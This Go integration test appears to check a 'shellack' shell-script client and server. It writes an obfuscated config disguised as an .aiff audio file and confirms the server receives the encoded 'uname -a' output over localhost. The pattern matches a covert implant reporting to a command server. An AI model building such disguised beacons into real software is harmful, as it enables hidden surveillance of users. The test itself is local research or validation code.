package tests

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestIntegration(t *testing.T) {
	// 1. Build the server
	serverDir := "../server"
	serverBin := filepath.Join(os.TempDir(), "shellack-server")
	
	cmd := exec.Command("go", "build", "-o", serverBin, ".")
	cmd.Dir = serverDir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("Failed to build server: %v\n%s", err, out)
	}
	defer os.Remove(serverBin)

	// 2. Start the server
	// Use a random high port? Let's try 10553.
	port := "10553"
	serverCmd := exec.Command(serverBin, port)
	
	// Capture server stderr (log output) to verify success
	serverOutPipe, err := serverCmd.StderrPipe()
	if err != nil {
		t.Fatalf("Failed to get stderr pipe: %v", err)
	}
	// serverCmd.Stdout = os.Stdout // Optional: print stdout to test output if needed

	if err := serverCmd.Start(); err != nil {
		t.Fatalf("Failed to start server: %v", err)
	}
	
	// Kill server at end of test
	defer func() {
		if serverCmd.Process != nil {
			serverCmd.Process.Kill()
		}
	}()

	// Wait a bit for server to start
	time.Sleep(1 * time.Second)

	// 3. Setup configuration file for the client
	// Script looks for ${path}/${MAGIC_WORD}.aiff
	// MAGIC_WORD default is "shellack"
	// Paths: /Library/Preferences/Audio/Data /tmp
	// We'll use /tmp/shellack.aiff
	
	configPath := "/tmp/shellack.aiff"
	// The content must be encoded: tr 012. .201
	// We want to write: "-port=10553 127.0.0.1"
	// Let's perform the reverse transformation.
	targetConfig := fmt.Sprintf("-port=%s 127.0.0.1", port)
	encodedConfig := encodeConfig(targetConfig)
	
	if err := ioutil.WriteFile(configPath, []byte(encodedConfig), 0644); err != nil {
		t.Fatalf("Failed to write config file: %v", err)
	}
	defer os.Remove(configPath)

	// 4. Run the shell script
	// We run it with a timeout.
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	scriptPath, _ := filepath.Abs("../shellack.sh")
	clientCmd := exec.CommandContext(ctx, "/bin/sh", scriptPath)
	clientCmd.Stdout = os.Stdout
	clientCmd.Stderr = os.Stderr
	
	if err := clientCmd.Start(); err != nil {
		t.Fatalf("Failed to start client script: %v", err)
	}

	// 5. Monitor server output for success
	// We expect the server to log the decoded response from "uname -a"
	// The server logs: "decode <nil>: <content>"
	
done := make(chan bool)
	go func() {
		scanner := bufio.NewScanner(serverOutPipe)
		for scanner.Scan() {
			line := scanner.Text()
			fmt.Println("[SERVER LOG]", line) // Forward to test output
			if strings.Contains(line, "decode <nil>:") {
				// Success!
				// Verify content if possible?
				// "Darwin" or "Linux"
				if strings.Contains(line, "Darwin") || strings.Contains(line, "Linux") {
					done <- true
					return
				}
			}
		}
	}()

	select {
	case <-done:
		t.Log("Test passed: Server received and decoded payload.")
	case <-ctx.Done():
		t.Fatal("Test failed: Timeout waiting for server to decode payload.")
	case <-time.After(15 * time.Second): // Safety net
		t.Fatal("Test failed: Timed out.")
	}
}

// encodeConfig applies the reverse transformation of "tr 012. .201"
// Forward: 0->. 1->2 2->0 .->1
// Reverse: .->0 2->1 0->2 1->.
func encodeConfig(s string) string {
	var b bytes.Buffer
	for _, c := range s {
		switch c {
		case '.':
			b.WriteRune('0')
		case '2':
			b.WriteRune('1')
		case '0':
			b.WriteRune('2')
		case '1':
			b.WriteRune('.')
		default:
			b.WriteRune(c)
		}
	}
	return b.String()
}
